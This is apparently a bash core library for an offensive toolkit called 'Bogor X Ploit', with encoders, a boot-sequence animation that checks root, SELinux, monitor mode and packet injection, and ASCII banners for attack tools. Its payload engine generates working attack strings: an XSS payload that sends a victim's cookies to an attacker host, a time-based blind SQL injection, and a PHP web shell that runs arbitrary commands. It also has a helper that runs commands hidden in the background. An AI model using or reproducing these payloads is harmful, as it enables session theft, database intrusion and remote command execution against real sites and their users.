#!/usr/bin/env bash
# ============================================
#   BXP CORE LIBRARY v2.0 (Clean & Animated)
#   By Bogor X Ploit x Ijul v5.0
# ============================================

export C='\033[0;36m'; export B='\033[0;34m'; export W='\033[1;37m'
export R='\033[0;31m'; export Y='\033[1;33m'; export G='\033[0;32m'; export N='\033[0m'

# --- 1. Network Engine ---
bxp_http_request() {
    local url="$1"; local payload="$2"
    local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) BXP-Engine/2.0"
    local response_time
    response_time=$(curl -s -A "$user_agent" --max-time 5 -o /dev/null -w "%{time_total}" "${url}${payload}" 2>/dev/null)
    if [ -z "$response_time" ] || [ "$response_time" = "0.000000" ]; then
        echo "TIMEOUT/ERROR"
    else
        echo "$response_time"
    fi
}

# --- 2. Encoder Engine ---
bxp_encode_b64() { echo -n "$1" | base64 | tr -d '\n'; }
bxp_encode_hex() {
    if command -v xxd >/dev/null 2>&1; then
        echo -n "$1" | xxd -p | tr -d '\n'
    else
        echo -n "$1" | od -An -tx1 | tr -d ' \n'
    fi
}
bxp_encode_url() { 
    echo -n "$1" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$1"; 
}

# --- 3. Payload Engine ---
bxp_gen_xss() { local host="$1" proto="${2:-http}"; echo "<script>new Image().src='${proto}://${host}:2010/?c='+encodeURIComponent(document.cookie);</script>"; }
bxp_gen_sqli() { [[ "$1" =~ ^[0-9]+$ ]] || return 1; echo "1' AND (SELECT 1 FROM (SELECT SLEEP($1))a)-- -"; }
bxp_gen_php_shell() { echo "<?php if(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c']); } ?>"; }

# --- 4. System Engine ---
bxp_hide_process() {
    local cmd="$1"
    nohup bash -c "$cmd" >/dev/null 2>&1 &
    disown 2>/dev/null || true
}

bxp_check_root() {
    if [ "$(id -u)" -eq 0 ]; then echo "Root"; else
        if command -v su >/dev/null 2>&1 && timeout 3 su -c id >/dev/null 2>&1; then echo "Root (su available)"; else echo "Non-Root"; fi
    fi
}

# --- 5. BXP BOOT SEQUENCE ENGINE (CLEAN TEXT, REAL EXECUTION) ---
bxp_boot_sequence() {
    local TOOL_NAME="$1"
    local START_TIME=$(date +%s%3N)
    local IS_ROOT=0
    local ENV_TYPE="Unknown"
    
    if [ "$(id -u)" -eq 0 ]; then IS_ROOT=1
    elif command -v su >/dev/null 2>&1 && timeout 3 su -c id >/dev/null 2>&1; then IS_ROOT=1; fi
    if [ -n "$PREFIX" ] && echo "$PREFIX" | grep -qi "com.termux"; then ENV_TYPE="Termux"; else ENV_TYPE="PC"; fi
    
    bxp_step_sleep() { sleep 0.3; }

    echo -e "  ${Y}[*] Synchronizing protocols preparing runtime...${N}"
    bxp_step_sleep
    echo -e "  ${G}[ OK ]${N} bash version: ${BASH_VERSION}"
    echo -e "  ${C}...${N}"
    bxp_step_sleep
    
    echo -ne "  ${Y}[*] Checking privilege level...${N}"
    bxp_step_sleep
    if [ "$IS_ROOT" -eq 1 ]; then
        if [ "$ENV_TYPE" = "Termux" ]; then echo -e " ${G}[ ROOT - Android ]${N}"; else echo -e " ${G}[ ROOT - PC ]${N}"; fi
    else
        echo -e " ${R}[ NON-ROOT ]${N}"
    fi

    if [ "$IS_ROOT" -eq 1 ]; then
        echo -ne "  ${Y}[*] Querying SELinux status...${N}"
        bxp_step_sleep
        if command -v getenforce >/dev/null 2>&1 && [ "$(getenforce)" = "Enforcing" ]; then
            echo -e " ${Y}[ WARN ] Enforcing${N}"
        else
            echo -e " ${G}[ OK ] Permissive/Disabled${N}"
        fi
        
        echo -ne "  ${Y}[*] Inspecting system partition...${N}"
        bxp_step_sleep
        if mount | grep -q " /system "; then
            if mount | grep " /system " | grep -q "rw"; then echo -e " ${G}[ OK ] Read/Write${N}"; else echo -e " ${Y}[ WARN ] Read-Only${N}"; fi
        else
            echo -e " ${R}[ FAIL ] /system not found${N}"
        fi
    else
        echo -ne "  ${Y}[*] Checking monitor mode capability...${N}"
        bxp_step_sleep
        if command -v iw >/dev/null 2>&1 && iw dev 2>/dev/null | grep -q "monitor"; then echo -e " ${G}[ OK ] Supported${N}"; else echo -e " ${R}[ FAIL ] Not Supported${N}"; fi
        
        echo -ne "  ${Y}[*] Checking packet injection...${N}"
        bxp_step_sleep
        if command -v aireplay-ng >/dev/null 2>&1; then echo -e " ${G}[ OK ] Supported${N}"; else echo -e " ${R}[ FAIL ] Not Supported${N}"; fi
        
        echo -ne "  ${Y}[*] Querying CPU architecture...${N}"
        bxp_step_sleep
        echo -e " ${G}[ OK ] ${N}$(uname -m)"
    fi

    echo -ne "  ${Y}[*] Loading cryptographic engine...${N}"
    bxp_step_sleep
    if command -v openssl >/dev/null 2>&1; then echo -e " ${G}[ OK ]${N}"; else echo -e " ${R}[ NOT FOUND ] fallback bash${N}"; fi

    echo -ne "  ${Y}[*] Verifying proxy configuration...${N}"
    bxp_step_sleep
    if [ -n "$http_proxy" ] || [ -n "$https_proxy" ]; then echo -e " ${G}[ OK ] Detected${N}"; else echo -e " ${Y}[ NOT SET ] Direct Connection${N}"; fi

    echo -ne "  ${Y}[*] Verifying storage permissions...${N}"
    bxp_step_sleep
    if [ -d "/sdcard" ] && [ -r "/sdcard" ]; then
        if [ "$ENV_TYPE" = "Termux" ]; then
            FILE_COUNT=$(ls -1 /sdcard 2>/dev/null | wc -l)
            echo -e " ${G}[ OK ] ${FILE_COUNT} items found${N}"
        else
            echo -e " ${G}[ OK ] Root fs accessible${N}"
        fi
    else
        echo -e " ${R}[ DENIED ] Run termux-setup-storage${N}"
    fi

    echo -ne "  ${Y}[*] Allocating memory for ${TOOL_NAME}...${N}"
    bxp_step_sleep
    if [ -f /proc/meminfo ]; then
        MEM_AVAIL=$(grep MemAvailable /proc/meminfo | awk '{print $2}')
        MEM_MB=$((MEM_AVAIL / 1024))
        echo -e " ${G}[ OK ] ${MEM_MB} MB Available${N}"
    else
        echo -e " ${R}[ FAIL ] Cannot read memory info${N}"
    fi

    echo -ne "  ${Y}[*] Pinging 8.8.8.8 ...${N}"
    bxp_step_sleep
    local PING_START=$(date +%s%3N)
    if ping -c 4 -W 2 8.8.8.8 >/dev/null 2>&1; then
        local PING_END=$(date +%s%3N)
        local PING_TIME=$((PING_END - PING_START))
        echo -e " ${G}[ OK ] Connected (${PING_TIME}ms)${N}"
    else
        echo -e " ${R}[ FAIL ] Network Offline${N}"
    fi

    echo -ne "  ${Y}[*] Initializing core processes...${N}"
    bxp_step_sleep
    PROC_COUNT=$(ps -A 2>/dev/null | wc -l)
    echo -e " ${G}[ OK ] ${PROC_COUNT} active PIDs${N}"

    if [ -f "$TOOL_NAME.sh" ]; then
        echo -ne "  ${Y}[*] Parsing module syntax...${N}"
        bxp_step_sleep
        if bash -n "$TOOL_NAME.sh" 2>/dev/null; then echo -e " ${G}[ OK ] Valid${N}"; else echo -e " ${R}[ FAIL ] Syntax Error${N}"; fi
    fi

    local END_TIME=$(date +%s%3N)
    local ELAPSED=$((END_TIME - START_TIME))
    
    echo -e "  ${G}[ SUCCESS ]${N} LAUNCHING ${W}${TOOL_NAME}${N}"
    sleep 0.5
    echo -e "  ${G}[+] Module ready. (${ELAPSED}ms)${N}"
}

# --- 6. HEADER ASCII ENGINE (FONT ASLI TUAN) ---
bxp_ascii_title() {
    local title="$1"
    clear
    sleep 0.2
    
    case "$title" in
        "NYCTOPHOBIA")
            echo -e "${C}"
            cat <<'ASCII'
 _   _  __   __  ____  _____  ___   ____   _   _   ___   ____  ___   _    
| \ | | \ \ / / / ___||_   _|/ _ \ |  _ \ | | | | / _ \ | __ )|_ _| / \   
|  \| |  \ V / | |      | | | | | || |_) || |_| || | | ||  _ \ | | / _ \  
| |\  |   | |  | |___   | | | |_| ||  __/ |  _  || |_| || |_) || ||  _  | 
|_| \_|   |_|   \____|  |_|  \___/ |_|    |_| |_| \___/ |____/|___|_| |_| 
ASCII
            echo -e "${N}\n" ;;
        "SLEEP PARALYSIS")
            echo -e "${R}"
            cat <<'ASCII'
 ____  _      ____  ____  ____    ____    _    ____  _      __   __  ___  ____  
/ ___|| |    | ____|  _ \|  _ \  |  _ \  / \  |  _ \| |     \ \ / / / _ \|  _ \ 
\___ \| |    |  _| | |_) | |_) | | |_) |/ _ \ | |_) | |      \ V / | | | | |_) |
 ___) | |___ | |___|  __/|  __/  |  __// ___ \|  _ <| |___    | |  | |_| |  _ / 
|____/|_____||_____|_|   |_|     |_|  /_/   \_\_| \_\_____|   |_|   \___/|_| \_\
ASCII
            echo -e "${N}\n" ;;
        "NOCTURNAL DECAY")
            echo -e "${Y}"
            cat <<'ASCII'
 _   _  ____   ____  _____  _   _  ____    _     ____    ____   ____   _   __   __
| \ | |/ __ \ / ___||_   _|| | | ||  _ \  / \   |  _ \  |  _ \ / ___| / \  \ \ / /
|  \| | |  | | |      | |  | | | || |_) |/ _ \  | | | | | |_) | |    / _ \  \ V / 
| |\  | |__| | |___   | |  | |_| ||  _ <|  _  | | |_| | |  _ <| |___/ ___ \  | |  
|_| \_|\____/ \____|  |_|   \___/ |_| \_\_| |_| |____/  |_| \_\\____/_/   \_\ |_|  
ASCII
            echo -e "${N}\n" ;;
        "CYBER ATTACK")
            echo -e "${C}"
            cat <<'ASCII'
  ██████╗██╗   ██╗██████╗ ███████╗██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
 ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
 ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
 ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
 ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
ASCII
            echo -e "${N}\n" ;;
        "EXHUME DISGUISE")
            echo -e "${C}"
            cat <<'ASCII'
  _____  __  __  _   _  _   _  _____    ____  ___  ____  _   _  _____  _____ 
 | ____| \ \/ / | | | || | | || ____|  |  _ \|_ _|/ ___|| | | |/ ___|| ____|
 |  _|    \  /  | |_| || | | ||  _|    | | | || |\___ \| | | |\___ \|  _|  
 | |___   /  \  |  _  || |_| || |___   | |_| || | ___) | |_| | ___) | |___ 
 |_____| /_/\_\ |_| |_| \___/ |_____|  |____/|___|____/ \___/ |____/|_____|
ASCII
            echo -e "${N}\n" ;;
        "CHOKE THE HUNTERS")
            echo -e "${R}"
            cat <<'ASCII'
   ____  _   _  ___   ____  _  __ _____    _____  _   _  _____    _   _  _   _  _   _  _____  ____  ____   _____  ____  
  / ___|| | | |/ _ \ |  _ \| |/ /| ____|  |_   _|| | | ||  ___|  | | | || | | || \ | || ____||  _ \|  _ \ / ___||  _ \ 
 | |    | |_| | | | || |_) | ' / |  _|      | |  | |_| || |__    | |_| || |_| ||  \| ||  _|  | |_) | |_) |\___ \| |_) |
 | |___ |  _  | |_| ||  _ <| . \ | |___     | |  |  _  ||  __|   |  _  ||  _  || |\  || |___ |  _ <|  _ < ___) |  _ / 
  \____||_| |_|\___/ |_| \_\_|\_\|_____|    |_|  |_| |_||_|      |_| |_||_| |_||_| \_||_____||_| \_\_| \_\____/|_| \_\
ASCII
            echo -e "${N}\n" ;;
        "RECLAIM CATCH")
            echo -e "${G}"
            cat <<'ASCII'
  ____  _____  ____  _        _     ___  __  __    ____    _  _____  ____  _   _ 
 |  _ \| ____|/ ___|| |      / \   |_ _| \ \/ /   / ___|  / \|_   _|/ ___|| | | |
 | |_) |  _| | |    | |     / _ \   | |   \  /   | |     / _ \ | |  \___ \| |_| |
 |  _ <| |___| |___ | |___ / ___ \  | |   /  \   | |___ / ___ \| |   ___) |  _  |
 |_| \_\_____|\____||_____/_/   \_\|___| /_/\_\   \____/_/   \_\_|  |____/|_| |_|
ASCII
            echo -e "${N}\n" ;;
        "OUIJA MAGNIFYING")
            echo -e "${Y}"
            cat <<'ASCII'
   ___  _   _ ___ _  _    _      __  __    _    ____ _   _ _____ _____ _   _  ____  
  / _ \| | | |_ _| \| |  / \    |  \/  |  / \  / ___| | | |  ___|  ___| | | |/ ___| 
 | | | | | | || ||  ` | / _ \   | |\/| | / _ \| |  _| |_| | |_  | |_  | |_| | |  _  
 | |_| | |_| || || |\  |/ ___ \  | |  | |/ ___ \ |_| |  _  |  _| |  _| |  _  | |_| | 
  \___/ \___/|___|_| \_/_/   \_\ |_|  |_/_/   \_\____|_| |_|_|   |_|   |_| |_|\____| 
ASCII
            echo -e "${N}\n" ;;
        *)
            echo -e "${C}====================================================${N}"
            echo -e "${W}    ${title}${N}"
            echo -e "${C}====================================================${N}\n"
            ;;
    esac
    sleep 0.2
}
